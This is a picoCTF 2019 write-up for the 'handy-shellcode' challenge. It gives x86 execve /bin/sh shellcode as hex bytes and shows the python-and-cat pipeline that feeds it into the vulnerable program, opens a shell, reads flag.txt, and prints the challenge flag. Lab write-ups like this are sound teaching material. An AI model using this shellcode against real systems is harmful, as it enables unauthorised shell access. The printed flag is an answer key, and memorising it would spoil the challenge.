# handy-shellcode
#### This [program](https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server. [Source](https://2019shell1.picoctf.com/static/60f2c9fc4aa125e85132fe694eff65d8/vuln.c).

Searching online we can find some shellcode to input into this program. `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80` worked for me. Using python to convert it to ascii, and using cat to keep the shell open, we can pipe the input into vuln and gain access to the root shell. Running cat flag.txt we solve the challenge.
```
Supermac30@pico-2019-shell1:/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"';cat) | ./vuln
Enter your shellcode:
1�Ph//shh/bin��P��S��
                    ̀
Thanks! Executing now...
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}
```
Flag: picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}
